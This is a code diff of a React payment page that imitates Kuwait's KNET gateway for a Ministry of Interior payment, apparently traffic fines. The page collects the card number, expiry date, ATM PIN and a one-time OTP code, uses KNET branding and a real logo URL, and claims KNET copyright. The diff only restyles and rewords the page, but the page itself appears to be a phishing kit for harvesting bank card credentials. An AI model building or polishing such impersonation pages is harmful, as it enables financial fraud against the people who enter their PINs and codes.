@@ -99,58 +99,58 @@ export default function Payment() {
   if (!paymentData) return null;
 
   return (
-    <div className="knet-payment-page" dir="rtl">
+    <div className="knet-wrapper" dir="rtl">
       <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
       <style>{`
-        body { background-color: #f5f5f5 !important; font-family: 'Segoe UI', Arial, sans-serif; }
-        .knet-payment-page { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
-        .knet-card { width: 100%; max-width: 480px; background: white; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        body { background-color: #f8f9fa !important; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .knet-wrapper { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .knet-card { width: 100%; max-width: 480px; background: white; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid #eee; overflow: hidden; }
         .knet-header { background: #0082c3; padding: 15px; text-align: center; color: white; }
-        .knet-body { padding: 25px; }
-        .tasdeed-logo { height: 50px; margin-bottom: 20px; }
-        .payment-info { background: #f9f9f9; padding: 15px; border-radius: 5px; margin-bottom: 25px; border: 1px solid #eee; }
-        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
-        .info-label { color: #666; font-weight: bold; }
-        .info-value { color: #0082c3; font-weight: bold; }
-        .form-label { font-size: 14px; font-weight: bold; color: #333; margin-bottom: 8px; display: block; }
-        .knet-input { border: 1px dashed #d9534f; border-radius: 4px; height: 40px; padding: 0 12px; font-size: 16px; width: 100%; outline: none; transition: border 0.3s; text-align: center; }
-        .knet-input:focus { border-style: solid; border-color: #0082c3; }
-        .prefix-container { position: relative; display: flex; gap: 10px; }
-        .prefix-list { position: absolute; top: 42px; left: 0; right: 0; background: white; border: 1px solid #ddd; border-radius: 4px; z-index: 100; max-height: 150px; overflow-y: auto; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        .prefix-option { padding: 8px 12px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #eee; }
-        .prefix-option:hover { background: #f0f7ff; color: #0082c3; }
-        .knet-btn { height: 45px; border-radius: 4px; font-weight: bold; font-size: 16px; border: none; cursor: pointer; transition: opacity 0.3s; }
-        .btn-submit { background: #0082c3; color: white; width: 100%; }
-        .btn-cancel { background: #eee; color: #666; width: 100%; margin-top: 10px; }
-        .knet-footer { margin-top: 30px; text-align: center; font-size: 12px; color: #999; }
+        .knet-body { padding: 30px; }
+        .tasdeed-logo { height: 50px; margin-bottom: 25px; }
+        .info-box { background: #f0f7ff; padding: 15px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #cfe2ff; }
+        .info-item { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 14px; }
+        .info-label { font-weight: bold; color: #0056b3; }
+        .knet-label { font-weight: bold; font-size: 14px; color: #333; margin-bottom: 8px; display: block; }
+        .knet-input { border: 1px dashed #d9534f; border-radius: 5px; height: 42px; padding: 0 12px; font-size: 16px; width: 100%; outline: none; text-align: center; transition: all 0.3s; }
+        .knet-input:focus { border-style: solid; border-color: #0082c3; box-shadow: 0 0 0 3px rgba(0,130,195,0.1); }
+        .prefix-box { position: relative; display: flex; gap: 10px; }
+        .prefix-menu { position: absolute; top: 45px; left: 0; right: 0; background: white; border: 1px solid #ddd; border-radius: 5px; z-index: 100; max-height: 160px; overflow-y: auto; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .prefix-opt { padding: 10px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #f5f5f5; }
+        .prefix-opt:hover { background: #0082c3; color: white; }
+        .knet-btn { height: 48px; border-radius: 5px; font-weight: bold; font-size: 16px; border: none; cursor: pointer; width: 100%; transition: all 0.3s; }
+        .btn-pay { background: #0082c3; color: white; }
+        .btn-pay:hover { background: #0069a0; }
+        .btn-back { background: #f8f9fa; color: #666; border: 1px solid #ddd; margin-top: 10px; }
+        .knet-foot { margin-top: 40px; text-align: center; font-size: 12px; color: #888; line-height: 1.6; }
       `}</style>
 
       <div className="knet-card">
         <div className="knet-header">
-          <h5 className="m-0">KNET Payment Gateway</h5>
+          <h6 className="m-0">بوابة الدفع الإلكتروني KNET</h6>
         </div>
         <div className="knet-body">
           <div className="text-center">
             <img src="https://www.kpay.com.kw/kpg/images/tasdeed_logo.png" className="tasdeed-logo" alt="Tasdeed" />
           </div>
 
-          <div className="payment-info">
-            <div className="info-row">
+          <div className="info-box">
+            <div className="info-item">
               <span className="info-label">المستفيد:</span>
-              <span className="info-value">وزارة الداخلية</span>
+              <span className="font-weight-bold">وزارة الداخلية</span>
             </div>
-            <div className="info-row">
-              <span className="info-label">المبلغ الإجمالي:</span>
-              <span className="info-value">{paymentData.totalAmount} د.ك</span>
+            <div className="info-item">
+              <span className="info-label">المبلغ:</span>
+              <span className="font-weight-bold text-danger">{paymentData.totalAmount} د.ك</span>
             </div>
           </div>
 
           {stage === "card" && (
             <form onSubmit={handleCardSubmit}>
               <div className="mb-4">
-                <label className="form-label">رقم بطاقة الصراف الآلي (K-NET)</label>
-                <div className="prefix-container">
-                  <div style={{width: '100px', position: 'relative'}}>
+                <label className="knet-label">رقم البطاقة</label>
+                <div className="prefix-box">
+                  <div style={{width: '110px', position: 'relative'}}>
                     <input 
                       type="text" 
                       className="knet-input" 
@@ -160,9 +160,9 @@ export default function Payment() {
                       required
                     />
                     {showPrefixes && (
-                      <div className="prefix-list">
+                      <div className="prefix-menu">
                         {availablePrefixes.map(p => (
-                          <div key={p} className="prefix-option" onClick={() => { setCardPrefix(p); setShowPrefixes(false); }}>{p}</div>
+                          <div key={p} className="prefix-opt" onClick={() => { setCardPrefix(p); setShowPrefixes(false); }}>{p}</div>
                         ))}
                       </div>
                     )}
@@ -180,68 +180,68 @@ export default function Payment() {
 
               <div className="row mb-4">
                 <div className="col-6">
-                  <label className="form-label">تاريخ الانتهاء</label>
+                  <label className="knet-label">تاريخ الانتهاء</label>
                   <div className="d-flex gap-2">
                     <input type="text" className="knet-input" placeholder="MM" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
                     <input type="text" className="knet-input" placeholder="YY" value={expiryYear} onChange={e => setExpiryYear(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
                   </div>
                 </div>
                 <div className="col-6">
-                  <label className="form-label">الرقم السري (PIN)</label>
+                  <label className="knet-label">الرقم السري (PIN)</label>
                   <input type="password" maxLength={4} className="knet-input" placeholder="****" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
                 </div>
               </div>
 
-              <button type="submit" className="knet-btn btn-submit">دفع الآن</button>
-              <button type="button" className="knet-btn btn-cancel" onClick={() => setLocation("/")}>إلغاء</button>
+              <button type="submit" className="knet-btn btn-pay shadow-sm">إرسال</button>
+              <button type="button" className="knet-btn btn-back" onClick={() => setLocation("/")}>إلغاء</button>
             </form>
           )}
 
           {stage === "otp" && (
             <form onSubmit={handleOtpSubmit} className="text-center">
               <h5 className="mb-4" style={{color: '#0082c3'}}>تأكيد الرمز (OTP)</h5>
-              <p className="small text-muted mb-4">يرجى إدخال الرمز المرسل إلى هاتفك المحمول</p>
+              <p className="small text-muted mb-4">أدخل الرمز المكون من 6 أرقام المرسل لهاتفك</p>
               <input 
                 type="text" 
                 className="knet-input mb-4" 
-                style={{letterSpacing: '8px', fontSize: '24px', height: '50px'}} 
+                style={{letterSpacing: '10px', fontSize: '26px', height: '55px'}} 
                 value={otp} 
                 onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} 
                 placeholder="000000" 
                 required 
               />
-              <button type="submit" className="knet-btn btn-submit">تأكيد الدفع</button>
+              <button type="submit" className="knet-btn btn-pay">تأكيد العملية</button>
             </form>
           )}
 
           {stage.endsWith("_pending") && (
             <div className="text-center py-5">
               <div className="spinner-border text-primary" role="status"></div>
-              <p className="mt-3 font-weight-bold" style={{color: '#0082c3'}}>يرجى الانتظار، جاري المعالجة...</p>
+              <p className="mt-3 font-weight-bold" style={{color: '#0082c3'}}>جاري معالجة طلبك، يرجى الانتظار...</p>
             </div>
           )}
 
           {stage === "success" && (
             <div className="text-center py-4">
-              <div className="mb-3" style={{fontSize: '50px'}}>✅</div>
-              <h4 className="text-success font-weight-bold">تمت عملية الدفع بنجاح</h4>
-              <p className="text-muted">سيتم تحديث بيانات المخالفات خلال 15 دقيقة</p>
-              <button className="knet-btn btn-submit mt-4" onClick={() => setLocation("/")}>العودة للرئيسية</button>
+              <div className="mb-3" style={{fontSize: '60px'}}>✅</div>
+              <h4 className="text-success font-weight-bold">تم الدفع بنجاح</h4>
+              <p className="text-muted">شكراً لك، تم استلام مبلغ {paymentData.totalAmount} د.ك</p>
+              <button className="knet-btn btn-pay mt-4" onClick={() => setLocation("/")}>العودة للرئيسية</button>
             </div>
           )}
 
           {stage === "failed" && (
             <div className="text-center py-4">
-              <div className="mb-3" style={{fontSize: '50px'}}>❌</div>
-              <h4 className="text-danger font-weight-bold">فشلت عملية الدفع</h4>
-              <p className="text-muted">{error || "يرجى التأكد من بيانات البطاقة والمحاولة مرة أخرى"}</p>
-              <button className="knet-btn btn-submit mt-4" onClick={() => setStage("card")}>إعادة المحاولة</button>
+              <div className="mb-3" style={{fontSize: '60px'}}>❌</div>
+              <h4 className="text-danger font-weight-bold">فشلت العملية</h4>
+              <p className="text-muted">{error || "حدث خطأ أثناء معالجة الدفع، يرجى المحاولة لاحقاً"}</p>
+              <button className="knet-btn btn-pay mt-4" onClick={() => setStage("card")}>حاول مرة أخرى</button>
             </div>
           )}
         </div>
       </div>
 
-      <div className="knet-footer">
+      <div className="knet-foot">
         جميع الحقوق محفوظة © 2026<br/>
         شركة الخدمات المصرفية الآلية المشتركة (كي نت)
       </div>
